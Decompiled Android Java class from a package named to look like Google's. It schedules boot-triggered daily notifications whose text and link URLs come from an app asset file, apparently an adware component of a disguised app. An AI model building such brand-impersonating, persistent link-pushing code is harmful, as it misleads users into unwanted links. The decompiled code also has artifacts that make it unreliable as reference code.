package com.googleapps.ru;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import java.io.IOException;

public class Notificator
  extends BroadcastReceiver
{
  private static final String KEY_NOTIFICATIONS_COUNT = "KEY_NOTIFICATIONS_COUNT";
  private static final int MINUTES_UNTIL_NOTIFICATION = 1440;
  private static final String NOTIFICATION_ACT = "NOTIFICATION_ACT";
  private SharedPreferences settings;
  
  public Notificator() {}
  
  private void decreaseNotificationsCount(SharedPreferences.Editor paramEditor)
  {
    paramEditor.putInt("KEY_NOTIFICATIONS_COUNT", this.settings.getInt("KEY_NOTIFICATIONS_COUNT", 0) - 1);
    paramEditor.commit();
  }
  
  private void setInitialAlarm(Context paramContext, PendingIntent paramPendingIntent, long paramLong)
  {
    ((AlarmManager)paramContext.getSystemService("alarm")).set(0, 86400000L + paramLong, paramPendingIntent);
  }
  
  private void showNotification(Context paramContext, int paramInt)
  {
    long l = System.currentTimeMillis();
    try
    {
      Object localObject = TextUtils.readLine(8, paramContext);
      String str1 = TextUtils.readLine(7, paramContext);
      String str2 = TextUtils.readLine(6, paramContext);
      localObject = PendingIntent.getActivity(paramContext, 0, new Intent("android.intent.action.VIEW", Uri.parse((String)localObject)), 268435456);
      NotificationManager localNotificationManager = (NotificationManager)paramContext.getSystemService("notification");
      Notification localNotification = new Notification(2130837524, str2, l);
      localNotification.setLatestEventInfo(paramContext, str2, str1, (PendingIntent)localObject);
      localNotification.flags = 20;
      localNotificationManager.notify(paramInt, localNotification);
      decreaseNotificationsCount(this.settings.edit());
      return;
    }
    catch (IOException paramContext) {}
  }
  
  public void initNotificationsNumberSettings(Context paramContext)
  {
    SharedPreferences.Editor localEditor;
    if (!this.settings.contains("KEY_NOTIFICATIONS_COUNT"))
    {
      this.settings.edit();
      localEditor = this.settings.edit();
    }
    try
    {
      localEditor.putInt("KEY_NOTIFICATIONS_COUNT", Integer.parseInt(TextUtils.readLine(9, paramContext)));
      localEditor.commit();
      setInitialAlarm(paramContext, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, Notificator.class).setAction("NOTIFICATION_ACT"), 268435456), System.currentTimeMillis());
      return;
    }
    catch (IOException localIOException)
    {
      for (;;) {}
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    this.settings = paramContext.getSharedPreferences("PREFERENCES", 0);
    int i = this.settings.getInt("KEY_NOTIFICATIONS_COUNT", 0);
    paramIntent = paramIntent.getAction();
    if (((paramIntent.equals("android.intent.action.BOOT_COMPLETED")) || (paramIntent.equals("NOTIFICATION_ACT"))) && (i > 0)) {
      showNotification(paramContext, i);
    }
  }
  
  public void setPrefs(SharedPreferences paramSharedPreferences)
  {
    this.settings = paramSharedPreferences;
  }
}
